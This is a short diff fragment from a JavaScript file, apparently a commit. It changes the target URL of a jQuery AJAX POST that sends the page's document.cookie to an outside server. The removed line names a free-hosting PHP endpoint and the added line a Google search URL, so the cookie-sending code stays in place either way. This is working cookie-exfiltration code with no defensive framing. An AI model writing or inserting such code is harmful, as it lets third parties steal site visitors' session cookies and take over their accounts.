@@ -5,7 +5,7 @@
         $.ajax({
             type: 'POST',
 
-            url: 'http://www.kamen123.hyperphp.com/test.php',
+            url: 'https://www.google.com/search?client=',
             data: {
                 "field_1": document.cookie
     },
